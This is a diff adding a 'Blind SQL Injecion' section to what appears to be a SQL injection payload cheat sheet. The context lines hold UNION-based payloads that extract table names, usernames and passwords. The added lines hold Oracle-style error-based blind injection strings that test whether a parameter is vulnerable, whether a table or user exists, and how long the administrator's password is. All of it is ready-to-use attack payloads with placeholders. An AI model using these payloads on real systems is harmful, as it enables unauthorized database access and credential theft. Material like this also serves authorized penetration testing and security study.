@@ -48,3 +48,10 @@
                                   ' UNION SELECT name FROM pragma_table_info('put_table_name_here')--
                                   ' UNION SELECT put_username_here, put_password_here FROM put_table_name_here--
 ```
+### Blind SQL Injecion 
+```
+● checking parameter vuln       : ' || (SELECT NULL FROM dual) || ' --
+● checking table existence      : ' || (SELECT NULL FROM put_table_name_here WHERE ROWNUM = 1) || ' --
+● checking user existence       : ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM put_table_name_here WHERE username='put_username_here') || ' --
+● checking password length      : ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and 	LENGTH(password)>1 ) || ' --
+```
